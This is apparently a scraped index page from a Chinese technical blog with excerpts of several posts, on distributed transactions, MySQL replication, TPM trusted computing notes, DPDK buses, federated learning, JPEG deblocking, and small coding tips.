		分布式事务常见解决方案整理：二阶段、三阶段、TCC、MQ+本地事务+消息校对 1、两阶段提交2、三阶段提交2.1 二阶段提交的缺点2.2 三阶段提交 3、TCC提交3.1 TCC提交的优点3.2 TCC提交的缺点3.3 TCC提交的注意事项 4、MQ消息+本地事务+消息校对4.1 首先为什么要加消息队列？4.2 需要注意的问题4.2.1 服务A先扣款100成功了，怎么保证一定能把消息发送到mq呢？4.2.2 既然已经保证了消息一定能发送出去，那服务B加钱100怎么保证幂等性呢？ 4.3 引入消息校验保证最终一致性 分布式事务是要保证多个服务下的多个数据库操作的一致性。
本文以银行转账为例，来说明下分布式事务的常见解决方案。比如服务A需要对用户A扣款100元，服务B需要对用户B新增100元。
1、两阶段提交 两阶段提交的典型应用是spring cloud alibaba的seata。其解决分布式事务的方案如下：
1）阶段一：事务管理器TM（服务A）发起全局事务请求，事务协调器TC生产全局唯一事务XID。XID通过微服务调用链传播。因此各微服务（服务A+服务B）到TC上注册为XID中的一个分支。
2）各微服务进行事务操作，然后将事务结果返回给事务协调器TC，TC根据所有服务的结果判断是全局commit还是全局rollback。
参考文章：
1：SpringBoot 整合 Seata
2、三阶段提交 2.1 二阶段提交的缺点 既然已经有二阶段提交了，那为什么还需要三阶段提交呢？因此接下来需要重点理解下，二阶段提交的优点和缺点。
二阶段提交的缺点：
1）同步阻塞问题：所有参与者的数据库事务都处于阻塞状态。如果某个参与者占用了某个公共资源，会导致其他服务请求该资源时也处于阻塞状态。因此不适用于高并发的情况。
2）事务协调者单点故障问题：二阶段中，事务协调者是非常重要的环节。如果在第2阶段，协调者宕机了，那么会导致相关数据库事务不能commit或rollback，会一致阻塞下去。
3）数据不一致的问题：在二阶段提交过程中，由于二阶段可能存在局部网络问题。可能存在协调者TC发出了commit或rollback请求，但是参与者未接收到。或者发出消息后，参与者宕机了等。那么也会导致相关事务未成功提交，导致存在数据不一致的问题。参与者在第二阶段超时未收到请求后，建议最好是rollback，当然这样也会存在数据不一致的情况，即本来应该是commit的情况。
2.2 三阶段提交 三阶段包含：CanCommit 准备阶段、PreCommit 预提交阶段、DoCommit 提交阶段。思想基本和二阶段基本是一致的。
1、引入了CanCommit阶段：该阶段会先进行服务的预检查工作（比如下订单，会先判断库存是否足够），因此该步骤不会锁资源。
我理解引入该阶段的优点是：
1）可以提前做校验，减少了资源的锁定时间。因此可以提升并发量。可以一定程度上解决二阶段中的同步阻塞问题。
2）如果超时未收到第二阶段PreCommit的通知的话，会自动取消。可以一定程度解决二阶段的事务协调者单点故障问题。
2、PreCommit预提交阶段后，参与者引入了超时机制。如果未收到协调者发布的DoCommit信息，会超时执行commit阶段。
该阶段的优点是可以一定程度上解决事务协调者单点故障的问题。
可以看到三阶段提交和二阶段提交一样，依然都存在数据不一致的问题。针对这种事务异常的情况，可以在监测到事务异常时，通过脚本或者异步任务来补偿差异的信息，并进行告警。
3、针对二阶段中的数据不一致问题，可以使用超时重试机制。
参考文章：
1、分布式两阶段提交和三阶段提交
2、分布式事务 - 两阶段提交和三阶段提交
3、七种常见分布式事务详解
3、TCC提交 TCC也可以理解为二阶段提交，不过它是基于应用层面的提交：Try Confirm Cancer。
1）准备阶段：Try，业务系统做检测并预留资源 (加锁，锁住资源)，比如常见的下单，在try阶段，我们不是真正的减库存，也就是并没有进行数据库的事务操作。而是把下单的库存给锁定住，比如通过redis锁住对应资源。
2）根据第一阶段的结果决定是执行confirm还是cancel。Confirm：执行真正的业务（执行业务，进行数据库的事务操作，释放锁）。Cancel：是对Try阶段预留资源的释放（出问题，不进行数据库的事务操作，释放锁）。
3.1 TCC提交的优点 1、并发性能提升：TCC的本质原理是把数据库的二阶段提交上升到微服务来实现，从而避免了数据库在二阶段提交中，由于锁冲突、长事务而导致的阻塞低性能问题。可以一定程度上解决二阶段的同步阻塞问题。
即将数据库阶段中的事务的阻塞等待，转化为了微服务间调用的阻塞。以转账为例，比如二阶段提交中服务A进行了数据库事务操作扣款了100元，接着就要等待服务B进行数据库事务操作增加100元，此时服务A的数据库事务就处于阻塞状态。而TCC提交的话，服务A执行了Confirm中的数据库的事务后，服务A的数据库事务就可以commit了，不用处于阻塞状态，如果服务B超时未成功返回的话，服务A可以再调用Cancer再进行回滚。
当然TCC的前提是默认Confirm阶段和Cancer阶段是一定可以执行成功的。
2、数据最终一致性：基于 Confirm 和 Cancel 的幂等性，保证事务最终完成确认或者取消，保证数据的一致性。可以解决二阶段提交中的数据不一致的问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30aae78d3be385779309289e6147980d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8e013b89d13ed9645f4b92048b9d605/" rel="bookmark">
			mysql主从复制概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql主从复制概述 1、mysql主从复制概述1.1 mysql主从复制的优点：1.2 主从复制步骤如下：1.3 问题1：主库中position位置之前的数据，怎么同步给从库呢？1.4 问题2：主从不同步，有哪些方式进行避免？ 1、mysql主从复制概述 1.1 mysql主从复制的优点： 1、提升读写性能：比如某一个sql的执行会锁住整张表，此时如果由从库可以提供读的功能，那么可以实现读写分离，主库写，从库读，提升性能。
2、提高可用性：比如备份数据，可以对从库来备份数据，避免主库备份影响到主库的写入。又比如主库故障了，可以切换到从库。
1.2 主从复制步骤如下： 1、主库配置server-id, bin-log文件名，创建拥有复制权限的账号并授权给从库；
2、从库配置server-id, bin-log文件名，relay-log。从库执行change master命令，指向主库的ip, 端口， 日志文件，日志文件position。执行start slave命令开启从库同步（箭头2），然后会同步主库中position之后数据。
3、如果slave发送的指定bin-log日志position点之后没有新内容，主库不会进行任何操作。当有数据更新时
（箭头1），主库会通过master IO线程将更新的数据，以及最新的bin-log文件名和position位置，发送给从库（箭头3）。
4、从库接收到数据后，通过Slave IO线程将接收到的日志内容依次添加到Slave端的relay-log文件的最末端（箭头4），并将读取到的Master端的 bin-log的文件名和position点记录到master.info文件中，以便在下一次读取的时候能告知master从响应的bin-log文件名及最后一个position点开始发起请求。
5、Slave Sql线程检测到relay-log中内容有更新，会立刻解析relay-log的内容在Master真实执行时候的那些可执行的SQL语句，将解析的SQL语句并在Slave里执行（箭头5），执行成功后，Master库与Slave库保持数据一致。
备注1：
主要会用到3个线程：主库的IO线程、从库的IO线程和执行sql线程。
主要会用到2个文件：主库的bin-log日志文件，从库的relay-log中继日志文件。
备注2：
主库与从库之间维持了一个长链接，主库内部有一个线程，专门服务于从库的这个长链接的。
备注3：
binlog 日志有三种格式，分别是statement（sql语句），row（真实数据）和mixed。
MySQL的大叔想了一个折中的方案，mixed格式的binlog。所谓的mixed格式其实就是row和statement格式混合使用，当MySQL判断可能数据不一致时，就用row格式，否则使用就用statement格式。
1.3 问题1：主库中position位置之前的数据，怎么同步给从库呢？ 1、主从同步，只是针对主库中position位置之后的数据进行同步的。如果要对存量数据进行同步，就需要先对主库加锁，再使用linux的mysqldump命令，先对主库中的数据库进行备份。然后使用linux 的mysql命令将备份数据传到从库的机器上，然后在从库上再全量写入到从库中。
由于主库白天一般来说都有在写入，因此这种存量数据的复制，一般考虑凌晨进行同步，这样master的file和position的变化少一点，对用户的影响也少一点。
1.4 问题2：主从不同步，有哪些方式进行避免？ 1、避免从库压力大：可以多加几台从库。避免从库访问量过大而消耗大量CPU，导致没有资源去及时同步主库数据。当然从库也不宜过多，一般3-5台就可以了。
2、避免操作大事务：大事务意味着从库要执行的时间也很长，从而导致主从复制时间长，会导致主从不同步。比如一个事务执行就要10分钟，那么主库执行完后，给到从库执行，最后这个事务可能就会导致从库延迟10分钟。
3、主从配置不一致：使用同等高版本的mysql。高版本的mysql可以多线程复制。
4、从库复制响应慢：可以通过配置参数来提升从库性能，直接禁用slave端的binlog，sync_binlog在slave端设置为0。
参考文章：
1、MySQL主从复制详解及实战
2、MySQL的主从
3、mysql主从
4、mysql主从不一致，重新同步从库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/752859a19ef6b8bbeef22442f42b3b08/" rel="bookmark">
			程序员如何实现财富自由
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		程序员如何实现财富自由？今天我想和大家聊聊这个事情。
财富自由应该是所有人的终极目标，但实现财富自由似乎是一件不太可能的事情，即使程序员的平均工资已经非常高了。
我个人经常在想，当我财富自由的时候，可以不用上班，可以做自己喜欢的事情，可以天天躺着，天天打游戏，想想都美滋滋。
那怎么实现财富自由呢？今天想和大家交流下。
首先我们需要先定义清楚什么是财富自由。
财富自由是有一千万？一个亿？十个亿？还是多少钱？
我认为都不是，财富自由应该是你的“睡后收入”能满足你的日常支出。这里注意是睡觉的睡，也就是你每天啥也不用干，光睡觉，就有收入，这些收入还能满足你的消费。哪里有这么好的事情呢？
举个例子，你有十套房子，每套房子月租金一万，那你每个月的被动收入就是十万，这个就叫睡后收入，也叫被动收入。
请问每个月躺着挣十万，是不是财富自由，我觉得太是了，做梦都能笑醒。 那么问题来了，去哪里领十套房子？(开玩笑~
所以如果想实现财富自由，我们就需要去追求被动收入。那对我们程序员来讲，被动收入有哪些渠道呢？我来列举几个例子：
出租房子/商铺的租金长期投资的股票/基金的收益和分红你做了一个比较好的付费 APP，持续能带来收益你写了一本比较好的书，每年都能卖出去很多你制作了一套教程或视频，每年都有人买（比如掘金课程、慕课视频等）你写了一个商城网站，源码放在网上付费下载做一个 SEO 排名非常高的网站，靠广告带来持续收益（比如测网速、编码解码等网站） 类似这种有长尾收益的事情，我觉得都是被动收入。你能想到其它哪些事情？欢迎留言交流~
虽然我们知道了财富自由是什么，知道了被动收入，但似乎实践起来非常难，有无从下手的感觉。
那是因为我们没有制定清晰的可执行的目标。
有些朋友可能会问了，那你有实现财富自由吗？
那必然是没有的，如果有的话我现在就在睡觉了，而不是在录视频。我现在也处于目标拆解阶段，后面有进度的话会和大家分享交流。
最后我想说：如果你不开始，那你永远不可能达到目标，让我们一起向财富自由进发！
关于Python技术储备 学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
一、Python所有方向的学习路线 Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python必备开发工具 三、精品Python学习书籍 当我学到一定基础，有自己的理解能力的时候，会去阅读一些前辈整理的书籍或者手写的笔记资料，这些笔记详细记载了他们对一些技术点的理解，这些理解是比较独到，可以学到不一样的思路。
四、Python视频合集 观看零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
五、实战案例 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
六、Python练习题 检查学习结果。
七、面试资料 我们学习Python必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】 Python资料、技术、课程、解答、咨询也可以直接点击下面名片，添加官方客服斯琪↓
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c71df8efa52eab5105a6727ced23b2b/" rel="bookmark">
			可信计算专业课(停更)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 可信计算概述可信平台模块可信计算关键技术 可信平台模块可信平台模块的技术基础基于身份的密码体制TPM密钥功能分类 可信平台模块规范==认证==可信根认证密钥保护区域完整性度量报告 信任链构建技术1.可信根2.可信传递可信度量 信任链的技术基础信任链理论基础信任链构建分类 上课没书，抄又抄不过来，先记这，里面大部分内容作者不懂。。
可信计算概述 定义、原理必考
可信计算的技术体系:
如浏览器的证书即可信认证
可信计算密码支撑平台是可信计算平台的重要组成部分，提供数字签名、身份认证、消息加密、内部资源的授权访问、可信链的建立和完整性测量等服务，为平台的身份可信性、完整性和数据保密性提供密码支持。可信软件栈(TSS,TCG Software Stack)提供了应用程序访问TPM的接口，同时对TPM进行管理。TSS是可信计算密码支撑平台内部的支撑软件，为平台外部提供访问TPM的接口。可信计算平台是构建在计算系统中并用来实现可信计算功能的支撑系统。可信网络连接TNC (Trusted Network Connect)的目的是确保网络访问者的完整性。TNC通过网络访问请求，搜集和验证请求者的完整性信息，依据一定的安全策略对这些信息进行评估，决定是否允许请求者与网络连接，从而确保网络连接的可信性。 可信平台模块 可信平台模块安全芯片，是指符合TPM标准的安全芯片，它能有效地保护PC、防止非法用户访问。嵌有TPM的平台被称作为可信计算平台。TPM通过可信软件栈TSS为可信计算平台上的应用程序提供 完整性度量、存储和报告、远程证明，数据保护和密钥管理 4大核心功能。TPM的上述4大核心功能为平台提供了一个可信赖的环境,保障了平台中信息的机密性、完整性、真实性和可靠性。 完整性度量、存储和报告
TPM利用此功能实现可信计算“信任传递"。在可信传递过程中,TPM对影响平台完整性的实体进行度量，并将度量事件记入存储度量日志然后通过“扩展操作"将度量值存储到其内部的平台配置寄存器( PCR,Platform Configuration Register)。实体询问时， TPM忠实报告PCR中的值。远程证明
TPM拥有唯一的背书密钥(EK, Endorsement Key) ，可信计算平台用EK证书唯一标识其身份。为了保护平台隐私，TPM使用平台身份认证密钥AlK (Attestation ldentity Key)作为EK的别名，利用EK生成AlK，通过PCA (Privacy Certificate Authorities)签发AIK证书完成平台身份认证，通过使用AIK对当前平台的PCR值进行签名完成平台完整性状态证明。数据保护
TPM具有很好物理防篡改性,它通过建立保护区域，实现对敏感数据的访问授权。用PCR保护完整性度量值，用非易失性存储器保护EK(背书密钥)、存储根密钥SRK及属主授权数据，用以SRK为根的加密保护区保护EK之外的密钥和平台数据。特别地,还提供密封存储的数据保护手段，包括Seal操作和UnSeal操作。密钥管理
TPM安全管理7类密钥的生成、使用和存储，包括存储密钥、签名密钥、身份证明密钥(AIK和EK)、绑定密钥、密封密钥、派生密钥和鉴别密钥。各类密钥的使用功能受TPM严格限制，以增强系统安全性。这些密钥按移植属性不同被分为可迁移密钥(Migratable Key)和不可迁移密钥(Non-Migratable Key) 。 可信计算关键技术 可信计算包括5个关键技术,他们是完整可信系统所必须的，这个系统将遵从TCG规范。
签注密钥: 是一个2048位的RSA公共和私有密钥对，它在芯片出厂时随机生成并且不能改变。安全输入输出: 指电脑用户和他们认为与之交互的软件间受保护的路径。储存器屏蔽：拓展了一般的储存保护技术，提供了完全独立的储存区域。例如，包含密钥的位置。密封储存: 通过把私有信息和使用的软硬件平台配置信息捆绑在一起来保护私有信息。意味着该数据只能在相同的软硬件组合环境下读取。远程认证: 准许用户电脑上的改变被授权方感知。 信息安全具有4个侧面:设备安全、数据安全、内容安全与行为安全。
可信计算为行为安全而生。
可信平台模块 可信平台模块（TPM）是一项安全芯片的国际标准，旨在使用设备中集成的专用微控制器安全硬件处理设备中的加密秘钥。TPM作为可信根，必须无条件信任。
可信:意味着传达一个期望行为，而这种行为并不是可以预测的。可信平台模块安全芯片:可信平台模块安全芯片是指符合TPM标准的安全芯片，它能有效地保护PC、防止非法用户访问。可信构建块(TBB):是一个组件或者一系列组件，用来实例化一个可信根，是可信源的一部分。可信计算基(TCB):是一个基本的系统环境和资源(包含一些硬件和软件),是实现计算机系统安全保护的所有安全保护机制的集合，TCB可以保护自己不被TCB之外的软硬件所破坏。 TPM不属于TCB，可以用来确定系统的TCB是否被破坏TPM位于TCB底层，对TCB有一定的保护作用 基本概念
可信边界: TBB和可信根形成一个可信边界(Trusted Boundaries)，**在可信边界内，度量、存储和报告可以实现一个最小的配置。**在复杂的系统中，有必要用CRTM(Core Root of Trust for Measurement、可信度量根的核心)建立其它代码的可信
如果CRTM将系统控制权传给了其它代码,而没有考虑度量值是否匹配，那么认为信任边界被扩展了(可信引导的机制);如果CRTM在执行其它代码前，先验证其度量值是否是预期值，那么认为信任边界保持不变。显然，在可信引导情况下，随着信任链的扩展，信任边界也在扩展。 信任边界意思就是你信任事物依据的条件。比如信任网站用的证书，如果不用证书进行验证就信任了，就是信任边界拓宽了。
可信传递: 可信传递(Transitive Trust)是一个过程，可信根建立一个可执行函数的初始可信，然后该函数中的可信用于建立下一个可执行函数的可信。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c71df8efa52eab5105a6727ced23b2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a940ad4d12303c190df2996e65804fe5/" rel="bookmark">
			无聊的一天，就用python随便做个控制台小游戏吧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		游戏规则，有一个九宫格（显示为x），每个格子从左上到右下分别排序0，1，2，3，4，5，6，7，8
输入对应的数字来扫清数字，一共3个‘o’，一个‘v’，如果扫到v则赢，扫到o则输
源码如下：
import random a = random.randint(0,8) b = a while b == a : b = random.randint(0,8) c = a while c == a : c = b while c == b : c = random.randint(0,8) pop = 0 print('x',' ','x',' ','x') print('x',' ','x',' ','x') print('x',' ','x',' ','x') List1 = ['x ','x ','x'] List2 = ['x ','x ','x'] List3 = ['x ','x ','x'] answ = int(input()) while answ &lt; 0 or answ &gt; 8: print('请重新输入') answ = int(input()) answ2 = answ while answ2 !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a940ad4d12303c190df2996e65804fe5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83806f04d78c7a39fe8c55edad726292/" rel="bookmark">
			泛微OA_E9之明细表选择框，选项带出主表审批人
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1、需求描述1.1 需求1.2 描述示例1：当明细行只有一行时示例2：当明细行有多行时 2、思路3、效果效果1：明细表中的“选择框A”字段，当选项包含“选项4”或“选项5”时，审批人为A效果2： 明细表中的“选择框A”字段，当选项不包含“选项4”或“选项5”时，审批人为B 4、步骤4.1 本次使用E9流程表单前端接口API介绍4.1.1 明细字段值变化触发事件4.1.2 获取明细行所有行标示4.1.3 获取单个字段值4.1.4 系统样式的Confirm确认框 4.2 上代码 5、总结 1、需求描述 1.1 需求 明细表中的“选择框A”字段，当选项包含“选项4”或“选项5”时，审批人为A，否则为B。
1.2 描述 在泛微OA流程引擎中，主表字段是唯一可以做为节点操作者条件。如果将明细表选择框A字段值等同于主表选择框D字段值时，主表选择框D字段获取到的值，只有明细第一行的选择框A字段值，第二行、第三行等多行的选择框A字段值就获取不了。
示例1：当明细行只有一行时 示例2：当明细行有多行时 2、思路 在上一篇文章《泛微OA_E9之明细表当前行check框选中，其余明细行check框置灰，并将当前明细行中某字段赋值到主表字段》中提到过，明细表是不确定因素，但这次的需求不是取唯一值，而是取所有值。
第一步，获取明细行所有行标示，遍历明细行选择框A字段，将选择框A字段所有值组成新的数组；
第二步，一次的流程提交，不会所有选项都选择，所以要将未选择的选项值进行删除；
第三步，判断新数组中，如果包含有“选项4”或“选项5”的值时，审批人为A，否则为B。
3、效果 效果1：明细表中的“选择框A”字段，当选项包含“选项4”或“选项5”时，审批人为A 效果2： 明细表中的“选择框A”字段，当选项不包含“选项4”或“选项5”时，审批人为B 4、步骤 4.1 本次使用E9流程表单前端接口API介绍 具体《E9流程表单前端接口API》详情，请参考泛微官方文献，本篇只介绍需要用到的API。 4.1.1 明细字段值变化触发事件 绑定后对新添加的明细行字段以及加载的已有行明细字段，值变更触发所绑定的事件 bindDetailFieldChangeEvent: function(fieldMarkStr,funobj) 参数说明
参数参数类型必须说明fieldMarkStrString是绑定的明细字段标示，不能有下划线标示，可多个拼接逗号隔开，例如：field110,field111funobjFunction是字段值变更触发自定义函数，函数默认传递以下三个参数，参数1：字段标示(field27583)，参数2：行标示，参数3：修改后的值 样例：
jQuery(document).ready(function(){ WfForm.bindDetailFieldChangeEvent("field27583,field27584",function(id,rowIndex,value){ console.log("WfForm.bindDetailFieldChangeEvent--",id,rowIndex,value); }); }); 4.1.2 获取明细行所有行标示 getDetailAllRowIndexStr： function(detailMark) 参数说明
参数参数类型必须说明detailMarkString是明细表标示，明细1就是detail_1，以此递增类推 样例：
console.log(WfForm.getDetailAllRowIndexStr("detail_2")); //输出1，3...等等 特别注意：
//遍历明细行的写法 var rowArr = WfForm.getDetailAllRowIndexStr("detail_1").split(","); for(var i=0; i&lt;rowArr.length; i++){ var rowIndex = rowArr[i]; if(rowIndex !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83806f04d78c7a39fe8c55edad726292/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad2e050ccc7b653a5bd9010b1232b1bb/" rel="bookmark">
			dpdk 用户态驱动框架之总线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 dpdk 用户态驱动框架及其演进过程分析 这篇文章中，我描述了 dpdk 用户态驱动框架在引入总线框架前的演进过程，却对新的总线框架一笔带过，在本文中来探讨下 dpdk 总线框架做个收尾。
dpdk 总线框架演进过程 dpdk 于 2017.1 月引入 rte_bus 抽象模型，此模型包括如下内容：
一个、多个设备被连接到一个总线驱动是管理一个或多个设备的运行实例总线负责识别设备（以及进行中断上报）驱动负责初始化设备 2017.4 月 rte_bus 抽象模型的第一个实例——fslmc 总线引入 dpdk
2017.10 月 eal 中 pci 框架相关代码被移动到 pci bus 实现中
2017.11 月 vdev 框架被作为一个 bus 驱动实现
……
老版本中没有总线的概念，本该由总线提供的功能在 rte_eal_init 函数执行逻辑中隐藏。当引入了总线抽象后，设备的枚举、设备驱动的 probe 等过程都合并到总线中，驱动框架变得更加复杂，层次却更分明了。
下面我基于 dpdk 2022.9 月的代码探讨下 dpdk rte_bus 框架的部分实现细节。
dpdk rte_bus 抽象结构 rte_bus 作为一种抽象数据结构，可以被实例化为多种不同的类型，如 pci 总线、vdev 总线、dpaa 总线等等。dpdk 中使用了一个链表来将多种总线类型实例链接起来，通过这一链表实现总线的注册、删除、并封装对每个已注册总线虚函数（scan、probe）的调用。
rte_bus 抽象类定义如下：
struct rte_bus { RTE_TAILQ_ENTRY(rte_bus) next; /**&lt; Next bus object in linked list */ const char *name; /**&lt; Name of the bus */ rte_bus_scan_t scan; /**&lt; Scan for devices attached to bus */ rte_bus_probe_t probe; /**&lt; Probe devices on bus */ rte_bus_find_device_t find_device; /**&lt; Find a device on the bus */ rte_bus_plug_t plug; /**&lt; Probe single device for drivers */ rte_bus_unplug_t unplug; /**&lt; Remove single device from driver */ rte_bus_parse_t parse; /**&lt; Parse a device name */ rte_bus_devargs_parse_t devargs_parse; /**&lt; Parse bus devargs */ rte_dev_dma_map_t dma_map; /**&lt; DMA map for device in the bus */ rte_dev_dma_unmap_t dma_unmap; /**&lt; DMA unmap for device in the bus */ struct rte_bus_conf conf; /**&lt; Bus configuration */ rte_bus_get_iommu_class_t get_iommu_class; /**&lt; Get iommu class */ rte_dev_iterate_t dev_iterate; /**&lt; Device iterator.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad2e050ccc7b653a5bd9010b1232b1bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f77bc2c555ba83e7ec5482c807b90dda/" rel="bookmark">
			Clustered Federated Learning 论文源码阅读笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章的阅读论文是《Clustered Federated Learning: Model-Agnostic Distributed Multitask Optimization Under Privacy Constraints》，主要是对论文的作者提供的源码简单的分析一下，留个记录方便之后查看，免得之后重新翻源码。源码地址如下：GitHub源码地址
（源码里是用jupyter，我直接转换成py然后在pycharm里看了，这样看函数方便一些）
1、首先是压缩包解压后的文件，其中包括五个模块，入口在最上面的模块，其中data是我自行修改的，源码中数据集下载的root是“.”，我修改成./data这样更美观一点。 工程结构图 2、 clustered_federated_learning.py INPUT 1 示例中使用的是经典的EMNIST的byclass数据集，使用只用到了20000 idcs，前10000用作训练，后面用作测试，并且假设的client一共设计有10个，开始时用split_noiid函数打散数据集并且分成十份，所用的函数定义在data_utils中，其实简单来说就是用 np.random.dirichlet 函数使得数据集趋向于noiid分布在十份客户端中。
INPUT1 部分代码 INPUT 2 第二部分利用绘图将之前打散的数据绘图出来，证明其中的数据分布满足NoIID，因为没有开jupyter就不截图了，大家懂这个意思就行。
INPUT 3 接着作者做了一件事，将前五个client的数据全部旋转180度，经典的人为制造差异，使得后续的计算中将前五个client和后五个client成功分组，然后证明能够更好的效果。
INPUT 3 旋转一部分clinet的图像 INPUT 4 作者初始化client和server，这部分函数先不说，后续会根据函数代码给大家展示。
初始化时带上了model，这部分很简单，定义在model模块，大家自己看看就行。
INPUT 5 接下来是重点部分，首先作者定义运行80轮，接着定义了eps_1 和 eps_2两个值，至于两个值作用，论文里说的很清楚了，不多赘述，后面也会用到。
参数初始化 for开头循环80轮 开始先做一个判断，第一轮时会初始化client，就是将server端的weight复制到client储存里，相当于初始化同步操作
接着随机选择client进行计算，但是因为本来client就很少，不可能再减少了，所以ftac=1.0，这个就是比例，比例为100%，相当于全选
接着需要每一个client计算weight更新，更新完之后要记得reset，也就是计算完后全部恢复上一次的server端给的weight，因为后续真正的更新需要由server去给。
更新和reset的函数如下，subtract函数是将计算后的weight和weight-old相减计算差值
全部算完就轮到server出场了，server计算会返回一个矩阵，矩阵里就是每个clinet两两之间的余弦值了
矩阵计算，中间省略了一个函数的跳转，source里储存的是每一个client的dw值
接着分割的步骤来了，这里就可以看出eps的作用了，对照论文一目了然，其中作者为了准确度，分割至少需要在20轮之后，较为稳定再去做分割
其中cluster的算法作者直接使用的是AgglomerativeClustering函数，作者现在也在学习各种分类算法，k-means、层次之类的
后面的部分就没什么好说的了，最后附一张图吧。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c081af298c04d8ff1635f1209cc9ee99/" rel="bookmark">
			MATLAB环境下基于深度学习的JPEG图像去块（Image Deblocking）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前主要研究现代信号处理，深度学习嘛，一个大号/深层的，现代的，黑箱的，信号/图像处理器，所以，作为一个研究现代信号处理的，顺便搞些深度学习也是顺理成章的。本文程序运行环境为MATLAB R2018A。
代码如下
🍞正在为您运送作品详情
本文简要讲解如何训练一个经典的降噪卷积神经网络 （DnCNN），并使用DnCNN网络减少JPEG压缩伪影（compresaion artifact）。
本文讲解如何从头开始训练一个 DnCNN 网络，建议使用计算能力为 3.0 或更高版本的支持 CUDA 的 NVIDIA GPU，同时需要并行计算工具箱）。
图像压缩可以减少图像内存，JPEG 图像格式采用了一种功能强大的压缩方法，该方法使用所谓的质量因子quality factor来指定压缩量。降低quality值会导致更高的压缩比和更小的内存占用，但会牺牲图像的视觉质量。JPEG 压缩是有损的，这意味着压缩过程会导致图像丢失信息。对于 JPEG 图像，信息丢失显示为图像中的所谓的块效应blocking artifacts 。如下图所示，高压缩比会导致更多的信息丢失和更强的块效应。具有高频的纹理区域（如草地和云）看起来模糊不清，而锐利的边缘，如房子的屋顶和灯塔顶部的护栏，表现出所谓的振铃效应(ringing artifacts)。
JPEG图像去块（deblocking ）是减弱JPEG 图像中压缩伪影的过程，目前存在几种JPEG图像去块方法，包括深度学习。本例讲解一种基于深度学习的方法，尝试将 JPEG 压缩伪影的影响降至最低。
DnCNN网络
本例使用一种早已提出的深度前馈卷积神经网络DnCNN，DnCNN主要是为了消除图像中的噪声而设计的。但是，也可以训练 DnCNN 以消除 JPEG 压缩伪影或提高图像的分辨率。
DnCNN 网络经过训练，可根据彩色图像的亮度检测残差图像。图像的亮度通道 Y 通过红色、绿色和蓝色像素值的线性组合来表示每个像素的亮度。作为对比，图像的两个色度通道Cb和Cr是红色，绿色和蓝色像素值的不同线性组合。DnCNN仅使用亮度通道进行训练，因为人类感知对亮度变化比颜色变化更敏感。
为了描述方便，直接上英文
一旦DnCNN网络学会如何估计残差图像，就可以通过将残差图像加入到压缩后的亮度通道，然后将图像转换回RGB色彩空间以重建压缩JPEG图像的无失真版本。
训练数据
IAPR TC-12 数据集包含 20，000 张自然图像，包括人物，动物，城市等，约1.8 GB，本文为了简便，将使用 IAPR TC-12 数据集的一小部分数据来训练网络，所有图像均为 32 位 JPEG 彩色图像。
训练图像的数量
numel(trainImages.Files) ans = 251
准备训练数据
读取原始图像，创建文件夹，以正确组织训练数据
指定用于渲染图像压缩伪影的quality值，quality值在 [0， 100] 范围内。较小的quality值将导致高压缩比和更强的压缩伪影，因此对较小的quality值使用更密集的采样。
JPEGQuality = [5:5:40 50 60 70 80]; 写入原始和压缩后的训练图像。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c081af298c04d8ff1635f1209cc9ee99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2a9ee5149fc6961779ffa7d8ab1be99/" rel="bookmark">
			Android Studio启动非MainActivity页面的三个方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法1：在AndroidManifest.xml修改默认启动页面
添加相关代码即可
